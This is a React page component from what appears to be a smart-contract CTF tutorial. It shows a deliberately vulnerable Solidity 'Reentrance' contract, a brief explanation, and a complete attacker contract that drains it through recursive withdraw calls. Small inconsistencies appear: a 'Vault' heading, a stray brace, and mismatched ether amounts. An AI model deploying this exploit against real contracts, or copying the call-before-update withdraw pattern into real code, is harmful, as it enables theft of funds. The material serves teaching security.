import { useState } from "react";
import { Light as SyntaxHighlighter } from "react-syntax-highlighter";
import { atomOneDark } from "react-syntax-highlighter/dist/esm/styles/hljs";
import { AiFillCopy, AiOutlineFileDone } from "react-icons/ai";
import TextDiv from "../../components/TextDiv";

const ReEntrancy = () => {
  const [copy, setCopy] = useState(false);
  const codeString = `
  // SPDX-License-Identifier: MIT
  pragma solidity ^0.6.12;
  
  import 'openzeppelin-contracts-06/math/SafeMath.sol';
  
  contract Reentrance {
    
    using SafeMath for uint256;
    mapping(address => uint) public balances;
  
    function donate(address _to) public payable {
      balances[_to] = balances[_to].add(msg.value);
    }
  
    function balanceOf(address _who) public view returns (uint balance) {
      return balances[_who];
    }
  
    function withdraw(uint _amount) public {
      if(balances[msg.sender] >= _amount) {
        (bool result,) = msg.sender.call{value:_amount}("");
        if(result) {
          _amount;
        }
        balances[msg.sender] -= _amount;
      }
    }
  
    receive() external payable {}
  }
  }`;

  const solutionCode = `
  // SPDX-License-Identifier: MIT
  pragma solidity ^0.8.0;
  
  interface IReentrance {
      function donate(address) external payable;
  
      function withdraw(uint256) external;
  }
  
  contract Reenter {
      address public reentranceAddress;
  
      constructor(address _contractAddress) payable {
          reentranceAddress = _contractAddress;
      }
  
      function donate(address _to) external payable {
          IReentrance(reentranceAddress).donate{value: msg.value}(_to);
      }
  
      function withdraw() external {
          IReentrance(reentranceAddress).withdraw(0.001 ether);
      }
  
      function getBalance(address _who) public view returns (uint256) {
          return address(_who).balance;
      }
  
      function fundmeback(address payable _to) external payable {
          require(_to.send(address(this).balance), "could not send Ether");
      }
  
      receive() external payable {
          if (getBalance(reentranceAddress) != 0) {
              IReentrance(reentranceAddress).withdraw(msg.value);
          }
      }
  }
`;

  return (
    <div>
      <h1 className="headerText">Vault</h1>
      <div className="content">
        <div className="highlighterHeader">
          <p className="smallText"> Example code</p>
          {copy ? (
            <button className="copyButton">
              <span>
                <AiOutlineFileDone />
              </span>
              Copied!
            </button>
          ) : (
            <button
              className="copyButton"
              onClick={() => {
                navigator.clipboard.writeText(codeString);
                setCopy(true);
                setTimeout(() => {
                  setCopy(false);
                }, 3000);
              }}
            >
              <span>
                <AiFillCopy />
              </span>
              Copy Code
            </button>
          )}
        </div>
        <SyntaxHighlighter
          language="solidity"
          style={atomOneDark}
          customStyle={{
            padding: "25px",
            borderRadius: "0.375rem",
          }}
          wrapLongLines={true}
        >
          {codeString}
        </SyntaxHighlighter>
      </div>
      <div className="textBox">
        <TextDiv
          title="Hack"
          text="For the first we need to call donate() function for example with 0.0001 value, afther that
          we can call function withdraw(), and it will recursive call our receive function, which will again call withdraw()
          until balance of reentrance contract greater then zero, so it will call 10 times, because of balance == 0.001 ether."
        />
      </div>
      <SyntaxHighlighter
        language="solidity"
        style={atomOneDark}
        customStyle={{
          padding: "25px",
          borderRadius: "0.375rem",
        }}
        wrapLongLines={true}
      >
        {solutionCode}
      </SyntaxHighlighter>
    </div>
  );
};

export default ReEntrancy;
